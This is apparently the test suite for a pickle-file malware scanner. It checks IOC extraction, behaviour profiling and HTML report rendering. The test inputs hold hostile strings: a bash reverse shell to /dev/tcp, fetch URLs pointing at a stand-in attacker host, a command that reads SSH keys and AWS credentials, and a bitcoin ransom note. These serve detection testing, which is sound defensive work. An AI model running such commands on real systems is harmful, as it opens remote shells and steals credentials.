"""Tests for IOC extraction and malware-behavior classification."""
from pathlib import Path

import pytest

from picklelens import ioc, report
from picklelens.scanner import scan_file
from tests import make_samples

ROOT = Path(__file__).resolve().parent.parent
SAMPLES = ROOT / "samples"


@pytest.fixture(scope="session", autouse=True)
def _build():
    make_samples.build()


# -- IOC extraction ------------------------------------------------------

def test_extracts_url_ip_domain():
    i = ioc.extract(["fetch http://185.220.101.4/x then https://evil.top/y"])
    assert "http://185.220.101.4/x" in i.urls
    assert "https://evil.top/y" in i.urls


def test_extracts_bitcoin_and_ransom_note():
    i = ioc.extract([
        "Your files have been encrypted. Pay to "
        "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"])
    assert i.bitcoin
    assert i.ransom_signals


def test_extracts_reverse_shell_command():
    i = ioc.extract(["bash -i >& /dev/tcp/10.0.0.6/4444 0>&1"])
    assert any("/dev/tcp" in c for c in i.commands)


def test_extracts_stealer_targets():
    i = ioc.extract(["cat ~/.ssh/id_rsa ~/.aws/credentials"])
    assert "SSH keys" in i.stealer_signals
    assert "AWS credentials" in i.stealer_signals


def test_benign_strings_yield_no_iocs():
    i = ioc.extract(["tiny-net", "layer weights", "epoch 42"])
    assert i.is_empty()


# -- behavior classification maps each sample to the right profile -------

@pytest.mark.parametrize("sample,expected_profile", [
    ("mal_ransomware.pkl", "Ransomware"),
    ("mal_revshell.pkl", "Remote-access trojan / reverse shell"),
    ("mal_infostealer.pkl", "Infostealer / spyware"),
    ("mal_dropper.pkl", "Downloader / dropper"),
])
def test_profile(sample, expected_profile):
    r = scan_file(SAMPLES / sample)
    assert r.profile == expected_profile, f"{sample} -> {r.profile}"
    assert r.risk >= 70


def test_persistence_behavior_detected():
    r = scan_file(SAMPLES / "mal_persistence.pkl")
    assert any(b.key == "persistence" for b in r.behaviors)


def test_behaviors_carry_attck_ids():
    r = scan_file(SAMPLES / "mal_ransomware.pkl")
    ransom = next(b for b in r.behaviors if b.key == "ransomware")
    assert "T1486" in ransom.attck


def test_benign_has_no_behaviors_and_low_risk():
    r = scan_file(SAMPLES / "benign_dict.pkl")
    assert r.behaviors == []
    assert r.risk == 0


# -- HTML report ---------------------------------------------------------

def test_report_is_self_contained_html():
    results = [scan_file(SAMPLES / n) for n in
               ("mal_ransomware.pkl", "benign_dict.pkl")]
    html = report.render(results)
    assert html.startswith("<!doctype html>")
    # No external resources -> safe to open anywhere, CSP-friendly.
    assert "<script" not in html
    assert "src=" not in html
    assert "stylesheet" not in html
    assert "Ransomware" in html
    assert "bc1qxy" in html
